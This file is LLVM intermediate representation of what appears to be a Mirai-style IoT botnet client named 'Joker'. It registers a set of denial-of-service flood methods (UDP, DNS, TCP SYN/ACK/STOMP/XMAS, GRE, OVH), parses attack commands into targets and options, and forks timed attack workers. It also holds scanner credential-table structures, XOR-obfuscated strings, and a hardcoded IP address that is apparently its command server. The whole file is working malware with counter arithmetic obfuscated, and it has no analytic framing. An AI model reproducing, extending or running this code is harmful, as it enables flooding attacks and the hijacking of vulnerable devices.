; ModuleID = 'host/ir_sub/Joker.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.28 = type { [16 x i64] }
%struct.timeval.29 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_ovh)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpusyn)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpall)
  call void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpfrag)
  call void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_asyn)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add i32 %17, 553594226
  %19 = add i32 %18, 1
  %20 = sub i32 %19, 553594226
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = sub i8 0, 1
  %30 = sub i8 %28, %29
  %31 = add i8 %28, 1
  store i8 %30, i8* @methods_len, align 1
  %32 = zext i8 %28 to i64
  %33 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %32
  store %struct.attack_method* %26, %struct.attack_method** %33, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 %22, 1453907396
  %24 = add i32 %23, 1
  %25 = add i32 %24, 1453907396
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %246

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %246

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 8693207122833770321
  %40 = sub i64 %39, 1
  %41 = add i64 %40, 8693207122833770321
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %246

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, 1
  %54 = add i64 %52, %53
  %55 = sub i64 %52, 1
  %56 = trunc i64 %54 to i32
  store i32 %56, i32* %4, align 4
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %47
  br label %246

; <label>:61:                                     ; preds = %47
  %62 = load i32, i32* %4, align 4
  %63 = sext i32 %62 to i64
  %64 = load i8, i8* %8, align 1
  %65 = zext i8 %64 to i64
  %66 = mul i64 5, %65
  %67 = icmp ult i64 %63, %66
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %61
  br label %246

; <label>:69:                                     ; preds = %61
  %70 = load i8, i8* %8, align 1
  %71 = zext i8 %70 to i64
  %72 = call noalias i8* @calloc(i64 %71, i64 24) #6
  %73 = bitcast i8* %72 to %struct.attack_target*
  store %struct.attack_target* %73, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %74

; <label>:74:                                     ; preds = %123, %69
  %75 = load i32, i32* %5, align 4
  %76 = load i8, i8* %8, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %129

; <label>:79:                                     ; preds = %74
  %80 = load i8*, i8** %3, align 8
  %81 = bitcast i8* %80 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 1
  store i32 %82, i32* %87, align 4
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 4
  store i8* %89, i8** %3, align 8
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %3, align 8
  %92 = load i8, i8* %90, align 1
  %93 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %93, i64 %95
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %96, i32 0, i32 2
  store i8 %92, i8* %97, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = sub i64 0, 5
  %101 = add i64 %99, %100
  %102 = sub i64 %99, 5
  %103 = trunc i64 %101 to i32
  store i32 %103, i32* %4, align 4
  %104 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i64 %106
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i32 0, i32 0
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %108, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i64 %112
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i32 0, i32 1
  %115 = load i32, i32* %114, align 4
  %116 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %117 = load i32, i32* %5, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 0
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %120, i32 0, i32 2
  %122 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %121, i32 0, i32 0
  store i32 %115, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %79
  %124 = load i32, i32* %5, align 4
  %125 = sub i32 %124, -48169947
  %126 = add i32 %125, 1
  %127 = add i32 %126, -48169947
  %128 = add nsw i32 %124, 1
  store i32 %127, i32* %5, align 4
  br label %74

; <label>:129:                                    ; preds = %74
  %130 = load i32, i32* %4, align 4
  %131 = sext i32 %130 to i64
  %132 = icmp ult i64 %131, 1
  br i1 %132, label %133, label %134

; <label>:133:                                    ; preds = %129
  br label %246

; <label>:134:                                    ; preds = %129
  %135 = load i8*, i8** %3, align 8
  %136 = getelementptr inbounds i8, i8* %135, i32 1
  store i8* %136, i8** %3, align 8
  %137 = load i8, i8* %135, align 1
  store i8 %137, i8* %9, align 1
  %138 = load i32, i32* %4, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 %139, -7876499419262424395
  %141 = sub i64 %140, 1
  %142 = sub i64 %141, -7876499419262424395
  %143 = sub i64 %139, 1
  %144 = trunc i64 %142 to i32
  store i32 %144, i32* %4, align 4
  %145 = load i8, i8* %9, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp sgt i32 %146, 0
  br i1 %147, label %148, label %238

; <label>:148:                                    ; preds = %134
  %149 = load i8, i8* %9, align 1
  %150 = zext i8 %149 to i64
  %151 = call noalias i8* @calloc(i64 %150, i64 16) #6
  %152 = bitcast i8* %151 to %struct.attack_option*
  store %struct.attack_option* %152, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %153

; <label>:153:                                    ; preds = %232, %148
  %154 = load i32, i32* %5, align 4
  %155 = load i8, i8* %9, align 1
  %156 = zext i8 %155 to i32
  %157 = icmp slt i32 %154, %156
  br i1 %157, label %158, label %237

; <label>:158:                                    ; preds = %153
  %159 = load i32, i32* %4, align 4
  %160 = sext i32 %159 to i64
  %161 = icmp ult i64 %160, 1
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  br label %246

; <label>:163:                                    ; preds = %158
  %164 = load i8*, i8** %3, align 8
  %165 = getelementptr inbounds i8, i8* %164, i32 1
  store i8* %165, i8** %3, align 8
  %166 = load i8, i8* %164, align 1
  %167 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %170, i32 0, i32 1
  store i8 %166, i8* %171, align 8
  %172 = load i32, i32* %4, align 4
  %173 = sext i32 %172 to i64
  %174 = add i64 %173, 62499656453787857
  %175 = sub i64 %174, 1
  %176 = sub i64 %175, 62499656453787857
  %177 = sub i64 %173, 1
  %178 = trunc i64 %176 to i32
  store i32 %178, i32* %4, align 4
  %179 = load i32, i32* %4, align 4
  %180 = sext i32 %179 to i64
  %181 = icmp ult i64 %180, 1
  br i1 %181, label %182, label %183

; <label>:182:                                    ; preds = %163
  br label %246

; <label>:183:                                    ; preds = %163
  %184 = load i8*, i8** %3, align 8
  %185 = getelementptr inbounds i8, i8* %184, i32 1
  store i8* %185, i8** %3, align 8
  %186 = load i8, i8* %184, align 1
  store i8 %186, i8* %12, align 1
  %187 = load i32, i32* %4, align 4
  %188 = sext i32 %187 to i64
  %189 = add i64 %188, -3343883888304673030
  %190 = sub i64 %189, 1
  %191 = sub i64 %190, -3343883888304673030
  %192 = sub i64 %188, 1
  %193 = trunc i64 %191 to i32
  store i32 %193, i32* %4, align 4
  %194 = load i32, i32* %4, align 4
  %195 = load i8, i8* %12, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %194, %196
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %183
  br label %246

; <label>:199:                                    ; preds = %183
  %200 = load i8, i8* %12, align 1
  %201 = zext i8 %200 to i32
  %202 = sub i32 0, 1
  %203 = sub i32 %201, %202
  %204 = add nsw i32 %201, 1
  %205 = sext i32 %203 to i64
  %206 = call noalias i8* @calloc(i64 %205, i64 1) #6
  %207 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i32 0, i32 0
  store i8* %206, i8** %211, align 8
  %212 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i32 0, i32 0
  %217 = load i8*, i8** %216, align 8
  %218 = load i8*, i8** %3, align 8
  %219 = load i8, i8* %12, align 1
  %220 = zext i8 %219 to i32
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  %223 = load i8*, i8** %3, align 8
  %224 = sext i32 %222 to i64
  %225 = getelementptr inbounds i8, i8* %223, i64 %224
  store i8* %225, i8** %3, align 8
  %226 = load i8, i8* %12, align 1
  %227 = zext i8 %226 to i32
  %228 = load i32, i32* %4, align 4
  %229 = sub i32 0, %227
  %230 = add i32 %228, %229
  %231 = sub nsw i32 %228, %227
  store i32 %230, i32* %4, align 4
  br label %232

; <label>:232:                                    ; preds = %199
  %233 = load i32, i32* %5, align 4
  %234 = sub i32 0, 1
  %235 = sub i32 %233, %234
  %236 = add nsw i32 %233, 1
  store i32 %235, i32* %5, align 4
  br label %153

; <label>:237:                                    ; preds = %153
  br label %238

; <label>:238:                                    ; preds = %237, %134
  %239 = call i32* @__errno_location() #7
  store i32 0, i32* %239, align 4
  %240 = load i32, i32* %6, align 4
  %241 = load i8, i8* %7, align 1
  %242 = load i8, i8* %8, align 1
  %243 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %244 = load i8, i8* %9, align 1
  %245 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %240, i8 zeroext %241, i8 zeroext %242, %struct.attack_target* %243, i8 zeroext %244, %struct.attack_option* %245)
  br label %246

; <label>:246:                                    ; preds = %238, %198, %182, %162, %133, %68, %60, %46, %32, %16
  %247 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %248 = icmp ne %struct.attack_target* %247, null
  br i1 %248, label %249, label %252

; <label>:249:                                    ; preds = %246
  %250 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %251 = bitcast %struct.attack_target* %250 to i8*
  call void @free(i8* %251) #6
  br label %252

; <label>:252:                                    ; preds = %249, %246
  %253 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %254 = icmp ne %struct.attack_option* %253, null
  br i1 %254, label %255, label %259

; <label>:255:                                    ; preds = %252
  %256 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %257 = load i8, i8* %9, align 1
  %258 = zext i8 %257 to i32
  call void @free_opts(%struct.attack_option* %256, i32 %258)
  br label %259

; <label>:259:                                    ; preds = %255, %252
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %73

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %73

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 %68, -1422770026
  %70 = add i32 %69, 1
  %71 = add i32 %70, -1422770026
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %15, align 4
  br label %37

; <label>:73:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %39

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %36

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add i32 %31, -1222969194
  %33 = add i32 %32, 1
  %34 = sub i32 %33, -1222969194
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %5, align 4
  br label %10

; <label>:36:                                     ; preds = %10
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  br label %39

; <label>:39:                                     ; preds = %36, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

